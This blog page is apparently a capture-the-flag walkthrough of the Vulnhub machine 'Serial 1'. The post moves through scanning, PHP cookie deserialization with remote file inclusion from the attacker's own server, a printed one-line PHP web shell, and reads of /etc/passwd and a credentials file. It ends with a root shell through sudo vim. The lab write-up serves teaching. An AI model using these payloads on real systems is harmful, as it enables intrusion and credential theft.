<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:hexterisk]">
<meta name="description" content="Name: serial: 1 Date release: 20 Aug 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
LHIP is the Local Host’s IP Address
Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
IP Discovery Run sudo netdiscover.
It detects online hosts by sending ARP requests.
Output of netdiscover.
192.168.1.8 happens to be the IP of the VM." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://hexterisk.github.io/blog/posts/2020/05/29/serial-1/" />


    <title>
        
            Serial 1: Pwn the world.  — A noob&#39;s attempt at blogging.
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://hexterisk.github.io/blog/main.min.bc21949b46a7b314448099a92fed1807acac025093285f474b88259eec0c62ba.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://hexterisk.github.io/blog/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://hexterisk.github.io/blog/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://hexterisk.github.io/blog/favicon-16x16.png">
    <link rel="manifest" href="https://hexterisk.github.io/blog/site.webmanifest">
    <link rel="mask-icon" href="https://hexterisk.github.io/blog/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://hexterisk.github.io/blog/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">

<meta itemprop="name" content="Serial 1">
<meta itemprop="description" content="Name: serial: 1 Date release: 20 Aug 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
LHIP is the Local Host’s IP Address
Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
IP Discovery Run sudo netdiscover.
It detects online hosts by sending ARP requests.
Output of netdiscover.
192.168.1.8 happens to be the IP of the VM."><meta itemprop="datePublished" content="2020-05-29T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-05-29T00:00:00+00:00" />
<meta itemprop="wordCount" content="721"><meta itemprop="image" content="https://hexterisk.github.io/blog"/>
<meta itemprop="keywords" content="Serial1,Vulnhub,pentesting,penetration,testing,vim," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://hexterisk.github.io/blog"/>

<meta name="twitter:title" content="Serial 1"/>
<meta name="twitter:description" content="Name: serial: 1 Date release: 20 Aug 2019 Author: sk4 Series: serial   Initial Discovery VMIP is the VM’s IP Address
LHIP is the Local Host’s IP Address
Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
IP Discovery Run sudo netdiscover.
It detects online hosts by sending ARP requests.
Output of netdiscover.
192.168.1.8 happens to be the IP of the VM."/>



    <meta property="article:section" content="Pentesting" />



    <meta property="article:published_time" content="2020-05-29 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://hexterisk.github.io/blog/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$cd ~/</span>
            <span class="logo__cursor" style=""></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://hexterisk.github.io/blog/about/">About</a></li><li><a href="https://hexterisk.github.io/blog/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
<main class="post">

    <div class="post-info">
        <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="feather feather-clock">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 6 12 12 16 14"></polyline>
            </svg>4 minutes

            

        </p>
    </div>

    <article>
        <h1 class="post-title">
            <a href="https://hexterisk.github.io/blog/posts/2020/05/29/serial-1/">Serial 1</a>
        </h1>

        

        <div class="post-content">
            <ul>
<li><strong>Name</strong>: <a href="https://www.vulnhub.com/entry/serial-1,349/">serial: 1</a></li>
<li><strong>Date release</strong>: 20 Aug 2019</li>
<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
<li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
</ul>
<p> </p>
<h2 id="initial-discovery">Initial Discovery</h2>
<p><code>VMIP</code> is the VM’s IP Address</p>
<p><code>LHIP</code> is the Local Host’s IP Address</p>
<p>Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.</p>
<h3 id="ip-discovery">IP Discovery</h3>
<p>Run <code>sudo netdiscover</code>.</p>
<p>It detects online hosts by sending ARP requests.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/1_image.png" alt="">
<em>Output of netdiscover.</em></p>
<p>192.168.1.8 happens to be the IP of the VM.</p>
<h3 id="port-discovery">Port Discovery</h3>
<p>Next, we move on to port discovery to find out if there any exposed ports, and their corresponding services.</p>
<p>Run <code>nmap -sC -sV -p- -A 192.168.1.8</code></p>
<p>Format: <code>nmap -sC -sV -p- -A VMIP</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/2_image.png" alt="">
<em>Output of nmap.</em></p>
<p>Nothing of consequence, although we might attempt connecting to the ssh service if we somehow get hold of the credentials.</p>
<h3 id="directory-discovery">Directory Discovery</h3>
<p>Attempting to enumerate through all the endpoints.</p>
<p>Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">common.txt</a> wordlist.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/3_image.png" alt="">
<em>Output of gobuster.</em></p>
<p><code>WORDLIST</code> is the dictionary containing a list of possible endpoints.</p>
<p>Run <code>gobuster dir -w common.txt -u 192.168.1.8</code></p>
<p>Format: <code>gobuster dir -w WORDLIST -u VMIP</code></p>
<p><code>/backup</code> endpoint seems interesting.</p>
<h3 id="manual-discovery">Manual Discovery</h3>
<p>So we visit the homepage.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/16_image.png" alt="">
<em>Homepage.</em></p>
<p>The word cookie seems to have some significance here. Let’s check out the cookies on the page.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/17_image.png" alt="">
<em>user cookie.</em></p>
<p>A cookie does exists for the user.</p>
<p>Let&rsquo;s checkout the <code>/backup</code> endpoint.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/31_image.png" alt="">
<em>/backup endpoint.</em></p>
<p>A <strong>bak.zip</strong> is present. Download it and uncompress it.</p>
<p>Run <code>unzip bak.zip</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/4_image.png" alt="">
<em>Files inside bak.zip</em></p>
<p>Analysis of the files is given as follows:</p>
<h4 id="indexphp">index.php</h4>
<p><img src="https://hexterisk.github.io/blog/Serial_1/6_image.png" alt="">
<em>index.php</em></p>
<p>We can see that a cookie is formed here, serialized and base64 encoded, based on the username provided.</p>
<p>The default cookie is <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =</code>.</p>
<p>Base64 decoding the cookie:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
print(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =&#34;</span>))
</code></pre></div><p><code>O: 4: ”User”: 2: {s: 10: ”Username”; s: 3: ”sk4&quot;; s: 9: ”Userwel”; O: 7: ”Welcome”: 0: {}}</code></p>
<h4 id="userclassphp">user.class.php</h4>
<p><img src="https://hexterisk.github.io/blog/Serial_1/7_image.png" alt="">
<em>user.class.php</em></p>
<p>The log class file is imported. This could potentially contain a vulnerability for LFI/RFI.</p>
<h4 id="logclassphp">log.class.php</h4>
<p><img src="https://hexterisk.github.io/blog/Serial_1/8_image.png" alt="">
<em>log.class.php</em></p>
<p>The stray <strong>$type_log</strong> variable could be used to mention files. Other than that, Plain and simple file that executes an echo for the message provided to it.</p>
<p> </p>
<h2 id="hunting-begins">Hunting begins</h2>
<p>We add the line <code>echo base64_encode(serialize(new User('admin')));</code> to obtain a cookie with user set as admin.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/12_image.png" alt="">
<em>Output a cookie with user set as admin.</em></p>
<p>We change the initialization class of the object <strong>$this→wel</strong>.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/10_image.png" alt="">
<em>Modified wel object.</em></p>
<p>We point the <strong>$type_log</strong> to <em><strong>/etc/passwd</strong></em>.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/11_image.png" alt="">
<em>Modified $type_log variable.</em></p>
<p>We then execute the <em><strong>user.class.php</strong></em> file to see if our changes yielded any results.</p>
<p>Run <code>php user.class.php</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/13_image.png" alt="">
<em>Modified user.class.php output.</em></p>
<p>We got the output of <em><strong>/etc/passwd</strong></em>, as specified in the changes.</p>
<p>A new cookie is also obtained.</p>
<p><code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ==</code></p>
<p>Let&rsquo;s decode it and check it&rsquo;s contents.</p>
<p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:11:&quot;/etc/passwd&quot;;}}</code></p>
<p>This proves that the instructions lie in the parameters provided inside the cookie.</p>
<p>We exploit the RFI vulnerability present here by spawning a local server and linking the <strong>$type_log</strong> variable to this shell file.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/14_image.png" alt="">
<em>Spawn a python3 Simple HTTP Server.</em></p>
<p>And modify the <em><strong>log.class.php</strong></em> file to fetch the shell.php file.</p>
<p>Added <code>http://192.168.1.6:8000/shell.php</code></p>
<p>Format: <code>http://LHIP:8000/shell.php</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/15_image.png" alt="">
<em>Modified $type_log variable.</em></p>
<p>Where, the <em><strong>shell.php</strong></em> file is as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]);
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Obtain the new cookie, and replace it with the previous cookie.</p>
<p>Run <code>php user.class.php</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/19_image.png" alt="">
<em>Cookie with shell.</em></p>
<p>The new cookie <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MzM6Imh0dHA6Ly8xOTIuMTY4LjEuNjo4MDAwL3NoZWxsLnBocCI7fX0=</code></p>
<p>Decodes to be</p>
<p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:33:&quot;http://192.168.1.6:8000/shell.php&quot;;}}</code></p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=whoami</code></p>
<p><code>Format: http://LHIP/?cmd=COMMAND</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/21_image.png" alt="">
<em>Output of GET request.</em></p>
<p>It worked!</p>
<p>We know have a makeshift shell.</p>
<p>After exploring around, I found a file named <em><strong>credentials.txt.bak</strong></em> in the root directory.</p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=ls /</code></p>
<p><code>Format: http://LHIP/?cmd=ls /</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/22_image.png" alt="">
<em>Output of GET request.</em></p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=cat /credentials.txt.bak</code></p>
<p>Format: <code>http://LHIP/?cmd=cat /credentials.txt.bak</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/23_image.png" alt="">
<em>Output of GET request.</em></p>
<blockquote>
<p>sk4:KywZmnPWW6tTbW5w</p>
</blockquote>
<p>They look like credentials of some sort.</p>
<p>I was able to successfully connect to the SSH service using these values as credentials. In the home directory itself is a file named <em><strong>flag.txt</strong></em>. It&rsquo;s the user flag.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/25_image.png" alt="">
<em>User flag.</em></p>
<p>Now, for privilege escalation, let&rsquo;s first find out all the binaries that can run with the superuser privilege.</p>
<p>Run <code>sudo -l</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/28_image.png" alt="">
<em>Output of sudo -l.</em></p>
<p>Vim can be run as sudo.</p>
<p>Run <code>sudo /usr/bin/vim</code></p>
<p>When you are in command mode(you&rsquo;re there already when vim opens), press <code>:</code> to enter commands.</p>
<p>Enter <code>!/bin/bash</code></p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/29_image.png" alt="">
<em>Spawn a shell from inside vim.</em></p>
<p>This forcefully spawns a bash shell. Since it is spawned via the vim binary, it will have the same privileges as the vim binary. Thus we obtained a root shell.</p>
<p>Then just navigate to the root directory and read the flag file.</p>
<p><img src="https://hexterisk.github.io/blog/Serial_1/30_image.png" alt="">
<em>Root flag.</em></p>

        </div>
    </article>

    <hr />

    <div class="post-info">
        <p>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="feather feather-tag meta-icon">
                <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
                <line x1="7" y1="7" x2="7" y2="7"></line>
            </svg><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/serial1">Serial1</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/vulnhub">Vulnhub</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/pentesting">pentesting</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/penetration">penetration</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/testing">testing</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/%20tags/vim">vim</a></span>
        </p>

        <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="feather feather-file-text">
                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
                <polyline points="14 2 14 8 20 8"></polyline>
                <line x1="16" y1="13" x2="8" y2="13"></line>
                <line x1="16" y1="17" x2="8" y2="17"></line>
                <polyline points="10 9 9 9 8 9"></polyline>
            </svg>721 Words</p>

        <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="feather feather-calendar">
                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                <line x1="16" y1="2" x2="16" y2="6"></line>
                <line x1="8" y1="2" x2="8" y2="6"></line>
                <line x1="3" y1="10" x2="21" y2="10"></line>
            </svg>2020-05-29 05:30 &#43;0530</p>
    </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">

            
            <span class="button previous">
                <a href="https://hexterisk.github.io/blog/posts/2020/05/23/taint-analysis/">
                    <span class="button__text">Taint Analysis</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://hexterisk.github.io/blog/posts/2020/05/31/serial-2/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Serial 2</span>
                </a>
            </span>
            

        </div>
    </div>
    

    
</main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content" style="margin-bottom: -0.8rem;">
            <span><a style="text-decoration: none;"> .</a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span><a style="text-decoration: none;" style="font-size: 1.4rem; margin-bottom: -1.0rem;">..:</a></span>
        </div>
    </div>
</footer>
            
        </div>

        




<script type="text/javascript" src="https://hexterisk.github.io/blog/bundle.min.08ccaf9cef8b4e0ebd0b0158e66a7bfc0ddbb2194cdb0099e8814ddb89cc7628b27b1158846564e6e03d9ffc5f4d1bc7dfc274d359f9408d1c63d73a3f7332e9.js" integrity="sha512-CMyvnO&#43;LTg69CwFY5mp7/A3bshlM2wCZ6IFN24nMdiiyexFYhGVk5uA9n/xfTRvH38J001n5QI0cY9c6P3My6Q=="></script>



    </body>
</html>
